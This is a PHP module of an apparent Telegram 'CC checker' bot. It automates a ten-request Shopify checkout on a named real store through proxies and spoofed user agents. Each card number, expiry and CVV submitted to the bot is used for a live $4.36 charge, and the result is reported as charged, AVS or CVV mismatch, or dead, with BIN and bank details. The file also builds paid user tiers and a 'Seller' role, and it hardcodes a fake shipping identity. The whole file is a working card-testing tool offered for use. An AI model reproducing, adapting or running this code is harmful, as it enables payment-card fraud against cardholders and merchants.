<?php

include('rnd-ua.php');

$pChkU = $isAdmin ? "Owner" : (in_array($user['id'], $f_data['premiuns']) ? "Premiun" : "Free");
if(in_array($user['id'], $sellers)){
$pChkU = "Seller";
}

$proxy = "🇺🇸 - Live!";
$gate = "𝙋𝙖𝙞𝙣";
$charged = "$4.36";
$retry = 0;

if(cCmd($msg['text'], ['/pa', '/Pa', '/pA', '/PA', '!pa', '!Pa', '!pA', '!PA', '.pa', '.PA', '.pA', '.Pa'])){
	$eMsg = explode(' ', $msg['text']);
	$cEMsg = count($eMsg);
	$cBin = cBin($eMsg[1]);
	
	include('accs-as.php');
	
if($cEMsg == 1){
output('sendMessage', [
'chat_id' => $chat['id'],
'text' => "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ".$gate." ♻️ -» <code>".$charged."</code>\n𝙁𝙤𝙧𝙢𝙖𝙩 -» <code>/at cc|month|year|cvc</code>",
'reply_to_message_id' => $msg['message_id']
]);
	}
else{
$msgId_bot = output('sendMessage', [
'chat_id' => $chat['id'],
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...",
'reply_to_message_id' => $msg['message_id']
])['result']['message_id'];

include('cc-analyzer.php');

if($cc == false || $month == false || $year == false || $cvv == false){
include('cc-errors.php');
}
else{
$yearcont=strlen($year);
if ($yearcont<=2){
$year = "20$year";
}
if($month == "01"){
$sub_month = "1";
}elseif($month == "02"){
$sub_month = "2";
}elseif($month == "03"){
$sub_month = "3";
}elseif($month == "04"){
$sub_month = "4";
}elseif($month == "05"){
$sub_month = "5";
}elseif($month == "06"){
$sub_month = "6";
}elseif($month == "07"){
$sub_month = "7";
}elseif($month == "08"){
$sub_month = "8";
}elseif($month == "09"){
$sub_month = "9";
}elseif($month == "10"){
$sub_month = "10";
}elseif($month == "11"){
$sub_month = "11";
}elseif($month == "12"){
$sub_month = "12";
}
start:
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <code>⚪️</code>"
]);
/*=====  Gate  ======*/
$num = rand(1000, 9999);
$coki = uniqid();
/*=====  quanty  ======*/
$qu = 76;
/*=====  url  ======*/
$site = "https://store.gia.edu/collections/featured-products/products/loose-diamond-display-cases?variant=31793327112323";
$url = explode("/", $site)[2];
/*=====  1REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$url/cart/add");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: '.$url.'',
'user-agent: '.$rnd_ua.'',
'origin: https://'.$url.'',
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryLBhVShmACrMxOrOL',
'referer: '.$site.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryLBhVShmACrMxOrOL
Content-Disposition: form-data; name="form_type"

product
------WebKitFormBoundaryLBhVShmACrMxOrOL
Content-Disposition: form-data; name="utf8"

✓
------WebKitFormBoundaryLBhVShmACrMxOrOL
Content-Disposition: form-data; name="id"

31793327112323
------WebKitFormBoundaryLBhVShmACrMxOrOL
Content-Disposition: form-data; name="add"


------WebKitFormBoundaryLBhVShmACrMxOrOL--
');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r1 = curl_exec($ch);

/*=====  2REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$url/cart");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'updates%5B31793327112323%5D=1&checkout=Check+Out');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r2 = curl_exec($ch);
$checkout1 = capturehtml($r2, 'location: ','
x-sorting-hat-podid:');
$checkout = substr($checkout1, 0, ''.$qu.'');
if(empty($checkout)){
$retry++;
goto start;
}
/*=====  3REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "$checkout");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r3 = curl_exec($ch);
$atv = trim(strip_tags(capture($r3, '"authenticity_token" value="','"')));
if(empty($atv)){
$retry++;
goto start;
}
/*=====  4REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "$checkout");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$atv .'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=sachiopremiun%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Sachio&checkout%5Bshipping_address%5D%5Blast_name%5D=YT&checkout%5Bshipping_address%5D%5Bcompany%5D=YT&checkout%5Bshipping_address%5D%5Baddress1%5D=118+W+132nd+St&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=New+York&checkout%5Bshipping_address%5D%5Bcountry%5D=US&checkout%5Bshipping_address%5D%5Bprovince%5D=New+York&checkout%5Bshipping_address%5D%5Bzip%5D=10027&checkout%5Bshipping_address%5D%5Bphone%5D=19006318646&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Sachio&checkout%5Bshipping_address%5D%5Blast_name%5D=YT&checkout%5Bshipping_address%5D%5Bcompany%5D=YT&checkout%5Bshipping_address%5D%5Baddress1%5D=118+W+132nd+St&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=New+York&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10027&checkout%5Bshipping_address%5D%5Bphone%5D=19006318646&checkout%5Bclient_details%5D%5Bbrowser_width%5D=360&checkout%5Bclient_details%5D%5Bbrowser_height%5D=621&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r4 = curl_exec($ch);

/*=====  5REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "$checkout?previous_step=contact_information&step=shipping_method");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r5 = curl_exec($ch);
$atv1 = trim(strip_tags(capture($r5, '"authenticity_token" value="','"')));
if(empty($atv1)){
$retry++;
goto start;
}
/*=====  6REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "$checkout");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$atv1.'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=Advanced+Shipping+Rules-free-shipping-0.00&checkout%5Bclient_details%5D%5Bbrowser_width%5D=360&checkout%5Bclient_details%5D%5Bbrowser_height%5D=621&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r6 = curl_exec($ch);

/*=====  7REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "$checkout?previous_step=shipping_method&step=payment_method");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r7 = curl_exec($ch);
$atv2 = trim(strip_tags(capture($r7, '"authenticity_token" value="','"')));
if(empty($atv2)){
$retry++;
goto start;
}
/*=====  8REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://deposit.us.shopifycs.com/sessions");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: deposit.us.shopifycs.com',
'Connection: keep-alive',
'Accept: application/json',
'Content-Type: application/json',
'User-Agent: '.$rnd_ua.'',
'Accept-Language: es-US,es;q=0.6',
'Origin: https://checkout.shopifycs.com',
'Sec-Fetch-Site: same-site',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://checkout.shopifycs.com/'
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","name":"Sachio YT","month":'.$sub_month.',"year":'.$year.',"verification_value":"'.$cvv.'"},"payment_session_scope":"'.$url.'"}');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r8 = curl_exec($ch);
$id = trim(strip_tags(capture($r8, '"id":"','"')));
if(empty($id)){
$retry++;
goto start;
}
/*=====  9REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "$checkout");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$atv2.'&previous_step=payment_method&step=&s='.$id.'&checkout%5Bpayment_gateway%5D=41457254531&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B19006318646&checkout%5Btotal_price%5D=436&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=360&checkout%5Bclient_details%5D%5Bbrowser_height%5D=621&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r9 = curl_exec($ch);
sleep(5);
/*=====  10REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "$checkout?from_processing_page=1&validate=true");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r10 = curl_exec($ch);
$msg2 = trim(strip_tags(capture($r10, '<p class="notice__text">','</p></div></div>')));
$time = substr(curl_getinfo($ch)['total_time'], 0, 4)."'s";

if($msg2 == "There was an issue processing your payment. Try again or use a different payment method."){
$retry++;
goto start;
}
elseif($msg2 == "You are not permitted to access this service."){
$retry++;
goto start;
}
elseif($msg2 == "Billing address can't be blank"){
$retry++;
goto start;
}

if((strpos($r10, "$checkout/thank_you"))){
$status = "Approved! ✅ -» Charged!";
$status1 = "thank_you -» ".$charged."";
}
elseif(strpos($r10, 'Your order is confirmed')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Your order is confirmed -» ".$charged."";
}
elseif(strpos($r10, 'Thanks Sachio YT!')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Thanks -» ".$charged."";
}
elseif(strpos($r10, 'Thank you for your order')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Thank you for your order -» ".$charged."";
}
elseif(strpos($r10, 'Thanks for Your Order')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Thanks for Your Order -» ".$charged."";
}
elseif(strpos($r10, 'Thank You For Your Order')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Thank You For Your Order -» ".$charged."";
}
elseif(strpos($r10, 'Thank you for order!')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Thank you for order! -» ".$charged."";
}
elseif(strpos($r10, 'Thank you for your purchase!')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Thank you for your purchase! -» ".$charged."";
}
elseif(strpos($r10, 'Thanks for your purchase!')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Thanks for your purchase! -» ".$charged."";
}
elseif(strpos($r10, 'Your order is on the way')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Your order is on the way -» ".$charged."";
}
elseif((strpos($r10, "$checkout/post_purchase"))){
$status = "Approved! ✅ -» Charged!";
$status1 = "purchase -» ".$charged."";
}
elseif($msg2 == "ZIP code does not match billing address"){
$status = "Approved! ✅ -» avs";
$status1 = "ZIP code does not match billing address";
}
elseif($msg2 == "Billing address info was not matched by the processor"){
$status = "Approved! ✅ -» avs";
$status1 = "Billing address info was not matched by the processor";
}
elseif($msg2 == "Security codes does not match"){
$status = "Approved! ✅ -» ccn";
$status1 = "Security codes does not match";
}
elseif($msg2 == "CVV does not match"){
$status = "Approved! ✅ -» ccn";
$status1 = "CVV does not match";
}
elseif($msg2 == "Security code was not matched by the processor"){
$status = "Approved! ✅ -» ccn";
$status1 = "Security code was not matched by the processor";
}
else{
$status = "Dead! ❌";
$status1 = "$msg2";
}
if($retry > 4){
$status = "Waos! ⛈";
$status1 = "Max Retry!";
}

output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <code>✨</code>"
]);

$rChk = "
零 𝘾𝘾 -» <code>".$cc."|".$month."|".$year."|".$cvv."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>".$status."</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>".$status1."</code>

朱 𝘽𝙞𝙣 -» <code>".$cBin['brand']."</code> - <code>".$cBin['type']."</code> - <code>".$cBin['level']."</code>
亥 𝘽𝙖𝙣𝙠 -» <code>".$cBin['bank']."</code>
空 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>".$cBin['country_name']." ".$cBin['flag']." - ".$cBin['currency_symbol']." ".$cBin['currency']."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>";
}
}
}
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => $rChk
]);